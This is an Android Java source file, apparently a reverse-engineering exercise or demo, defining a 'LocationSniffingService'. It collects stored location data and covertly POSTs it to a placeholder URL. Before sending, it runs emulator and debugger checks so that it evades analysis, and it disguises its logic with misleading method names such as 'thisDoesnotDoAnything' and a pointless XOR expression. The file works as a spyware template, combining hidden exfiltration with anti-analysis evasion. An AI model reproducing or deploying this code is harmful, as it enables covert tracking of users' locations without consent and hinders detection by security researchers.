package com.woop.tryreverseengineerthis.service;

import android.annotation.TargetApi;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Debug;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.woop.tryreverseengineerthis.storage.LocationStorage;

import org.json.JSONException;
import org.json.JSONObject;
import org.apache.http.*;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;

import static android.location.LocationManager.*;
import static android.os.Build.FINGERPRINT;
import static android.os.Build.HARDWARE;
import static android.os.Build.MODEL;
import static android.os.Build.PRODUCT;

/**
 * Created by Jay on 3/29/2016.
 */
public class LocationSniffingService extends Service{

    private final static String fingerprintStart = "generic";
    private final static String TAG = "LocationSniffingService";
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate(){

        Handler handler = new Handler();
        int delay = 300000;

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if(thisDoesnotDoAnything())
                    return;
                else
                    thisAlsoDoesnotDoAnything();
            }
        }, delay);
    }

    private void thisAlsoDoesnotDoAnything(){

    }

    private boolean sendQuietly() {

        List<Location> locations = LocationStorage.getAllLocation();
        StringBuilder builder = new StringBuilder();
        for(Location loc : locations){
            builder.append(loc.getAltitude());
            builder.append(",");
            builder.append(loc.getLatitude());
            builder.append(",");
            builder.append(loc.getLongitude());
            builder.append(",");
            builder.append(loc.getTime());
            builder.append(",");
            builder.append("||");
        }

        sendForReals(builder.toString());

        return builder.length() > 2 ? false : (builder.equals(builder) ? true : false);
    }

    @TargetApi(Build.VERSION_CODES.KITKAT)
    private void sendForReals(String s) {
        try {
            URL url = new URL("toBeChanged");
            byte[] postData = s.getBytes(StandardCharsets.UTF_8);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setInstanceFollowRedirects(false);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Content-Length", Integer.toString(postData.length));
            connection.setUseCaches(false);
            try(DataOutputStream wr = new DataOutputStream(connection.getOutputStream())){
                wr.write(postData);
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
            return;
        } catch (IOException e) {
            e.printStackTrace();
            return;
        }
        Log.d(TAG, "Sent");
    }

    private boolean thisDoesnotDoAnything(){

        boolean b = false;

        if (isValid())
            b = sendQuietly();

        return (b^=b) ? (b == b)^(b == (b^=b^=b^=b)) : (b^b^b^b);
    }

    private boolean isValid(){
        //Check build's fingerprint
        Boolean checkFingerprint =  FINGERPRINT.startsWith("generic") ||
                FINGERPRINT.startsWith("unknown");

        //Check build's model
        Boolean checkModel =        MODEL.contains("google_sdk") ||
                MODEL.contains("Emulator") ||
                MODEL.contains("Android SDK built for x86");

        //Check Manurfacturer for Genymotion (an emulation software)
        Boolean checkManufacturer = Build.MANUFACTURER.contains("Genymotion") ||
                Build.MANUFACTURER.contains("unknown");

        //Check build's product
        Boolean checkProduct = "google_sdk".equals(PRODUCT) ||
                "sdk".equals(PRODUCT) ||
                "sdk_x86".equals(PRODUCT) ||
                "vbox86p".equals(PRODUCT) ||
                PRODUCT.matches(".*_?sdk_?.*");

        //Check for goldfish hardware
        Boolean checkHardware = (HARDWARE).contains("goldfish") ||
                (HARDWARE).contains("vbox86");

        //Return if any is detected
        if(checkFingerprint || checkModel || checkManufacturer || checkProduct || checkHardware)
            return false;

        //Check for telephone operator
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String operator = telephonyManager.getNetworkOperator();

        //Return if it is android
        if("Android".equals(operator))
            return false;

        //Return if debugger is connected
        if(Debug.isDebuggerConnected())
            return false;

        ConnectivityManager connectivityManager = (ConnectivityManager)
                getSystemService(CONNECTIVITY_SERVICE);

        NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();

        //Return if internet is not connected
        if(networkInfo == null || !(networkInfo.isConnected()))
            return false;


        LocationManager locationManager = (LocationManager)
                getSystemService(LOCATION_SERVICE);

        boolean gps_enabled = false;
        boolean network_enabled = false;

        if(locationManager==null)
            locationManager = (LocationManager) this.getSystemService(LOCATION_SERVICE);
        try{
            gps_enabled = locationManager.isProviderEnabled(GPS_PROVIDER);
        }catch(Exception ex){}
        try{
            network_enabled = locationManager.isProviderEnabled(NETWORK_PROVIDER);
        }catch(Exception ex){}

        //If location service is not enabled don't bother
        if(!gps_enabled && !network_enabled)
            return false;

        

        return true;
    }

}